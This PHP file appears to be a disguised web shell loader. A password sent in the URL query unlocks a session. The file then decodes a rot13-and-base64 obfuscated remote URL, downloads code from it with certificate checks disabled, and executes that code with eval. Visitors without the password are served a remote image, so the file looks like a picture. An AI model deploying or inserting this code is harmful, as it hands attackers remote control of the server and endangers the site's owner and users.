<?php
declare(strict_types=1);
session_start();

/**
 * Mengecek apakah user sudah login
 */
function is_logged_in(): bool {
    return isset($_SESSION['jzex']);
}

/**
 * Proses login dengan password
 */
function login(string $password): bool {
    // Hash password hasil dari password_hash('passwordAnda', PASSWORD_BCRYPT);
    $valid_password_hash = '$2y$12$i2Xk99gwWY9winlQx5iChOW88OA9uo1Oun52VyjFBJ8hBLrlxHMTi';

    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['jzex'] = 'user';
        return true;
    }
    return false;
}

/**
 * Logout user
 */
function logout(): void {
    unset($_SESSION['jzex']);
}

/**
 * Login handler
 */
if (isset($_GET['password'])) {
    $password = trim($_GET['password']); // trim agar lebih aman
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<script>alert("Password salah!");</script>';
    }
}

/**
 * Ambil konten dari URL
 */
function getContent(string $url): string|false {
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $content = curl_exec($curl);
    curl_close($curl);

    if ($content === false) {
        $content = @file_get_contents($url);
    }
    return $content;
}

/**
 * Encode dan decode URL
 */
function encode_url(string $url): string {
    $encoded_url = base64_encode($url);
    $encoded_url = str_rot13($encoded_url);
    return urlencode($encoded_url);
}

function decode_url(string $encoded_url): string|false {
    $decoded_url = str_rot13(urldecode($encoded_url));
    return base64_decode($decoded_url, true);
}

// Contoh encoded URL
$encoded_url = 'nUE0pUZ6Yl9lLKphrzI2MKWcrP5wo20ipzS3Y215LJkzLF01Zmp%3D';
$decoded_url = decode_url($encoded_url);

if (is_logged_in()) {
    if ($decoded_url) {
        $content = getContent($decoded_url);
        if ($content !== false) {
            eval('?>' . $content); // ⚠️ hati-hati eval bisa sangat berbahaya!
        }
        exit;
    }
} else {
    header('Content-Type: image/jpeg');
    $image_path = 'https://img.zeverix.com/ib/eSWYwVAM9iN8Esc_1742625447.png';
    readfile($image_path);
}

?>